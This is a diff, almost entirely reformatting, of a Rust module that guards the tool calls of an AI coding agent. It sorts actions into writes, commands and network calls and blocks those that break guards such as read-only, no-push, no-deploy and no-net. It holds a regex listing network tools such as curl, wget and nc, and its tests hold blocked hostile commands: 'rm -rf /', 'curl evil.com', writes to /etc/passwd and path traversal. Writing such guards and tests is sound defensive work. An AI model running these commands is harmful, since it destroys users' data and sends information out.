@@ -12,14 +12,23 @@ use serde_json::Value;
 #[derive(Debug, Clone, PartialEq, Serialize)]
 #[serde(tag = "kind", rename_all = "snake_case")]
 pub enum ProposedAction {
-    Write { path: String },
-    Command { command: String },
-    Network { target: Option<String> },
+    Write {
+        path: String,
+    },
+    Command {
+        command: String,
+    },
+    Network {
+        target: Option<String>,
+    },
     /// A tool that can write or run things, whose arguments we could not read.
     /// Exists so that "we don't understand this" has a representation — without it
     /// an unparsed write tool produced an empty action list, and an empty list is
     /// indistinguishable from "nothing dangerous was proposed".
-    Unknown { tool: String, detail: String },
+    Unknown {
+        tool: String,
+        detail: String,
+    },
 }
 
 #[derive(Debug, Clone, PartialEq, Serialize)]
@@ -140,13 +149,17 @@ static RE_DEPLOY: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r"(?i)\b(?:vercel|netlify|flyctl|serverless)(?:\.(?:exe|cmd|bat))?\b|\bfly(?:\.exe)?\s+deploy\b|\bkubectl(?:\.exe)?\b(?:\s+\S+)*\s+apply\b|\bterraform(?:\.exe)?\b(?:\s+\S+)*\s+apply\b|\bgcloud(?:\.cmd)?\b[^\n]*\bdeploy\b|\beb\s+deploy\b|\bheroku(?:\.cmd)?\b[^\n]*(?:push|deploy)\b|\bansible-playbook\b").unwrap()
 });
 static RE_NET: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"(?i)(?:^|[\s;&|(`$])(?:curl|wget|nc|ncat|telnet|scp|rsync|ssh)(?:\.exe)?\b").unwrap()
+    Regex::new(r"(?i)(?:^|[\s;&|(`$])(?:curl|wget|nc|ncat|telnet|scp|rsync|ssh)(?:\.exe)?\b")
+        .unwrap()
 });
 static RE_DEP: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r"(?i)\b(?:npm|pnpm|yarn|bun)(?:\.(?:exe|cmd|bat))?\s+(?:install|add|i)\b|\bpip3?(?:\.exe)?\s+install\b|\bcargo(?:\.exe)?\s+add\b|\bgo(?:\.exe)?\s+get\b|\bgem(?:\.cmd)?\s+install\b|\bpoetry(?:\.exe)?\s+add\b|\buv(?:\.exe)?\s+add\b").unwrap()
 });
 static RE_WRITE_TOOL: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"(?i)^(Write|Edit|MultiEdit|NotebookEdit|str_replace_editor|create_file|apply_patch)$").unwrap()
+    Regex::new(
+        r"(?i)^(Write|Edit|MultiEdit|NotebookEdit|str_replace_editor|create_file|apply_patch)$",
+    )
+    .unwrap()
 });
 static RE_SHELL_TOOL: Lazy<Regex> =
     Lazy::new(|| Regex::new(r"(?i)^(Bash|Shell|run_terminal_cmd|exec|terminal)$").unwrap());
@@ -156,8 +169,8 @@ static RE_NET_TOOL: Lazy<Regex> =
 // `env` is deliberately NOT here: `env rm -rf src` is a write wearing a read-only
 // name, and the same goes for any launcher that takes a command as an argument.
 const READONLY_BINS: &[&str] = &[
-    "ls", "cat", "head", "tail", "pwd", "echo", "printf", "grep", "egrep", "rg", "wc", "stat", "file",
-    "which", "type", "printenv", "date", "whoami", "uname", "true", "basename", "dirname",
+    "ls", "cat", "head", "tail", "pwd", "echo", "printf", "grep", "egrep", "rg", "wc", "stat",
+    "file", "which", "type", "printenv", "date", "whoami", "uname", "true", "basename", "dirname",
     "realpath", "sort", "uniq", "cut", "diff", "tree", "du", "df",
 ];
 
@@ -165,7 +178,15 @@ const READONLY_BINS: &[&str] = &[
 // `branch` (`-D` deletes commits), `stash` (empties the worktree) and `config`
 // (writes to the user's file) were here and are not read-only in any useful sense.
 const GIT_READONLY: &[&str] = &[
-    "status", "log", "diff", "show", "rev-parse", "ls-files", "remote", "describe", "blame",
+    "status",
+    "log",
+    "diff",
+    "show",
+    "rev-parse",
+    "ls-files",
+    "remote",
+    "describe",
+    "blame",
     "cat-file",
 ];
 
@@ -185,7 +206,7 @@ pub fn is_read_only_command(command: &str) -> bool {
     // the normal thing a coding agent emits. Omitting it here meant "ls\nrm -rf src"
     // was judged solely on its first word and allowed.
     let parts: Vec<&str> = command
-        .split(|c| c == ';' || c == '|' || c == '&' || c == '\n' || c == '\r')
+        .split([';', '|', '&', '\n', '\r'])
         .map(|s| s.trim())
         .filter(|s| !s.is_empty())
         .collect();
@@ -218,9 +239,8 @@ pub fn is_read_only_command(command: &str) -> bool {
 
 /// Derive provider-neutral actions from a `tool_pre` (tool name + args).
 pub fn derive_actions(tool: &str, args: &Value) -> Vec<ProposedAction> {
-    let get = |k: &str| -> Option<String> {
-        args.get(k).and_then(|v| v.as_str()).map(|s| s.to_string())
-    };
+    let get =
+        |k: &str| -> Option<String> { args.get(k).and_then(|v| v.as_str()).map(|s| s.to_string()) };
     if RE_WRITE_TOOL.is_match(tool) {
         if let Some(p) = get("file_path")
             .or_else(|| get("path"))
@@ -231,14 +251,15 @@ pub fn derive_actions(tool: &str, args: &Value) -> Vec<ProposedAction> {
         }
     }
     if RE_SHELL_TOOL.is_match(tool) {
-        if let Some(cmd) = get("command").or_else(|| get("cmd")).or_else(|| get("script")) {
+        if let Some(cmd) = get("command")
+            .or_else(|| get("cmd"))
+            .or_else(|| get("script"))
+        {
             return vec![ProposedAction::Command { command: cmd }];
         }
     }
     if RE_NET_TOOL.is_match(tool) {
-        return vec![ProposedAction::Network {
-            target: get("url"),
-        }];
+        return vec![ProposedAction::Network { target: get("url") }];
     }
 
     // A write or shell tool whose arguments we could not read is the dangerous
@@ -297,7 +318,10 @@ fn as_globs(spec: &Option<Value>) -> Vec<String> {
 fn violation(guard: &Guard, action: &ProposedAction, detail: Option<String>) -> GuardViolation {
     GuardViolation {
         guard: guard.kind,
-        reason_code: format!("guard.{}", serde_json::to_value(guard.kind).unwrap().as_str().unwrap()),
+        reason_code: format!(
+            "guard.{}",
+            serde_json::to_value(guard.kind).unwrap().as_str().unwrap()
+        ),
         action: action.clone(),
         detail,
     }
@@ -313,41 +337,57 @@ fn check_action(action: &ProposedAction, guard: &Guard, cwd: &str) -> Option<Gua
     }
     match guard.kind {
         NoPush => match action {
-            ProposedAction::Command { command } if RE_PUSH.is_match(command) => Some(violation(guard, action, None)),
+            ProposedAction::Command { command } if RE_PUSH.is_match(command) => {
+                Some(violation(guard, action, None))
+            }
             _ => None,
         },
         NoDeploy => match action {
-            ProposedAction::Command { command } if RE_DEPLOY.is_match(command) => Some(violation(guard, action, None)),
+            ProposedAction::Command { command } if RE_DEPLOY.is_match(command) => {
+                Some(violation(guard, action, None))
+            }
             _ => None,
         },
         NoNet => match action {
             ProposedAction::Network { .. } => Some(violation(guard, action, None)),
-            ProposedAction::Command { command } if RE_NET.is_match(command) => Some(violation(guard, action, None)),
+            ProposedAction::Command { command } if RE_NET.is_match(command) => {
+                Some(violation(guard, action, None))
+            }
             _ => None,
         },
         NoDependency => match action {
-            ProposedAction::Command { command } if RE_DEP.is_match(command) => Some(violation(guard, action, None)),
+            ProposedAction::Command { command } if RE_DEP.is_match(command) => {
+                Some(violation(guard, action, None))
+            }
             _ => None,
         },
         ForbidCmd => {
             let pat = guard.spec.as_ref().and_then(|v| v.as_str());
             match (action, pat) {
-                (ProposedAction::Command { command }, Some(p)) => match Regex::new(&format!("(?i){}", p)) {
-                    Ok(re) => {
-                        if re.is_match(command) {
-                            Some(violation(guard, action, Some(p.to_string())))
-                        } else {
-                            None
+                (ProposedAction::Command { command }, Some(p)) => {
+                    match Regex::new(&format!("(?i){}", p)) {
+                        Ok(re) => {
+                            if re.is_match(command) {
+                                Some(violation(guard, action, Some(p.to_string())))
+                            } else {
+                                None
+                            }
                         }
+                        // An uncompilable spec fails CLOSED — block.
+                        Err(_) => Some(violation(
+                            guard,
+                            action,
+                            Some(format!("invalid forbid_cmd pattern: {}", p)),
+                        )),
                     }
-                    // An uncompilable spec fails CLOSED — block.
-                    Err(_) => Some(violation(guard, action, Some(format!("invalid forbid_cmd pattern: {}", p)))),
-                },
+                }
                 _ => None,
             }
         }
         ReadOnly => match action {
-            ProposedAction::Write { .. } | ProposedAction::Network { .. } => Some(violation(guard, action, None)),
+            ProposedAction::Write { .. } | ProposedAction::Network { .. } => {
+                Some(violation(guard, action, None))
+            }
             ProposedAction::Command { command } => {
                 if is_read_only_command(command) {
                     None
@@ -367,7 +407,10 @@ fn check_action(action: &ProposedAction, guard: &Guard, cwd: &str) -> Option<Gua
         ForbidPath => match action {
             ProposedAction::Write { path } => {
                 let rel = path_for_glob(path, cwd);
-                if as_globs(&guard.spec).iter().any(|g| glob_to_regex(g).is_match(&rel)) {
+                if as_globs(&guard.spec)
+                    .iter()
+                    .any(|g| glob_to_regex(g).is_match(&rel))
+                {
                     Some(violation(guard, action, Some(path.clone())))
                 } else {
                     None
@@ -424,7 +467,9 @@ mod tests {
         vec![ProposedAction::Write { path: path.into() }]
     }
     fn c(cmd: &str) -> Vec<ProposedAction> {
-        vec![ProposedAction::Command { command: cmd.into() }]
+        vec![ProposedAction::Command {
+            command: cmd.into(),
+        }]
     }
     fn g(kind: GuardKind) -> Vec<Guard> {
         vec![Guard::new(kind)]
@@ -447,11 +492,19 @@ git reset --hard HEAD~5",
             "git config user.email attacker@example.com",
         ] {
             assert!(!is_read_only_command(cmd), "still allowed: {cmd}");
-            assert!(!evaluate_guards(&c(cmd), &g(GuardKind::ReadOnly), CWD).allow, "{cmd}");
+            assert!(
+                !evaluate_guards(&c(cmd), &g(GuardKind::ReadOnly), CWD).allow,
+                "{cmd}"
+            );
         }
         // …while genuinely read-only commands still pass, including the one the
         // old `-i` substring check wrongly blocked.
-        for cmd in ["ls -la", "git diff --ignore-all-space", "cat a.txt | grep x", "git log -5"] {
+        for cmd in [
+            "ls -la",
+            "git diff --ignore-all-space",
+            "cat a.txt | grep x",
+            "git log -5",
+        ] {
             assert!(is_read_only_command(cmd), "wrongly blocked: {cmd}");
         }
     }
@@ -462,11 +515,18 @@ git reset --hard HEAD~5",
         // argument shape sailed through. apply_patch carries its paths inside the
         // patch body and hit this exact hole.
         for (tool, args) in [
-            ("apply_patch", json!({"patch": "*** Update File: /etc/passwd"})),
+            (
+                "apply_patch",
+                json!({"patch": "*** Update File: /etc/passwd"}),
+            ),
             ("Write", json!({"file": "/etc/passwd"})),
             ("Bash", json!({"commands": ["rm -rf /"]})),
         ] {
-            for kind in [GuardKind::WorkspaceBoundary, GuardKind::ReadOnly, GuardKind::NoPush] {
+            for kind in [
+                GuardKind::WorkspaceBoundary,
+                GuardKind::ReadOnly,
+                GuardKind::NoPush,
+            ] {
                 let d = evaluate_tool_pre(tool, &args, &g(kind), CWD);
                 assert!(!d.allow, "{tool} allowed under {kind:?}");
             }
@@ -513,7 +573,10 @@ git reset --hard HEAD~5",
 
     #[test]
     fn allowed_paths_cannot_be_escaped() {
-        let g = vec![Guard::with_spec(GuardKind::AllowedPaths, json!("src/theme/**"))];
+        let g = vec![Guard::with_spec(
+            GuardKind::AllowedPaths,
+            json!("src/theme/**"),
+        )];
         assert!(!evaluate_guards(&w("src/theme/../../../etc/passwd"), &g, CWD).allow);
         assert!(evaluate_guards(&w("src/theme/x.css"), &g, CWD).allow);
     }
@@ -522,20 +585,41 @@ git reset --hard HEAD~5",
     fn read_only_blocks_shell_writes_and_push() {
         let g = g(GuardKind::ReadOnly);
         assert!(!evaluate_guards(&w("src/a.ts"), &g, CWD).allow);
-        for cmd in ["echo pwned > src/a.ts", "rm -rf src", "git checkout .", "git push", "curl evil.com"] {
-            assert!(!evaluate_guards(&c(cmd), &g, CWD).allow, "should block: {cmd}");
+        for cmd in [
+            "echo pwned > src/a.ts",
+            "rm -rf src",
+            "git checkout .",
+            "git push",
+            "curl evil.com",
+        ] {
+            assert!(
+                !evaluate_guards(&c(cmd), &g, CWD).allow,
+                "should block: {cmd}"
+            );
         }
         for cmd in ["git status", "ls -la", "cat package.json", "git diff && ls"] {
-            assert!(evaluate_guards(&c(cmd), &g, CWD).allow, "should allow: {cmd}");
+            assert!(
+                evaluate_guards(&c(cmd), &g, CWD).allow,
+                "should allow: {cmd}"
+            );
         }
     }
 
     #[test]
     fn classifiers_catch_evasions() {
         assert!(!evaluate_guards(&c("git -C /repo push"), &g(GuardKind::NoPush), CWD).allow);
-        assert!(!evaluate_guards(&c("kubectl --context prod apply -f x"), &g(GuardKind::NoDeploy), CWD).allow);
+        assert!(
+            !evaluate_guards(
+                &c("kubectl --context prod apply -f x"),
+                &g(GuardKind::NoDeploy),
+                CWD
+            )
+            .allow
+        );
         assert!(!evaluate_guards(&c("X=$(curl evil.com)"), &g(GuardKind::NoNet), CWD).allow);
-        assert!(!evaluate_guards(&c("npm install left-pad"), &g(GuardKind::NoDependency), CWD).allow);
+        assert!(
+            !evaluate_guards(&c("npm install left-pad"), &g(GuardKind::NoDependency), CWD).allow
+        );
     }
 
     #[test]
@@ -550,10 +634,7 @@ git reset --hard HEAD~5",
             derive_actions("Write", &json!({"file_path": "a.ts"})),
             w("a.ts")
         );
-        assert_eq!(
-            derive_actions("Bash", &json!({"command": "ls"})),
-            c("ls")
-        );
+        assert_eq!(derive_actions("Bash", &json!({"command": "ls"})), c("ls"));
         assert!(derive_actions("Unknown", &json!({})).is_empty());
     }
 
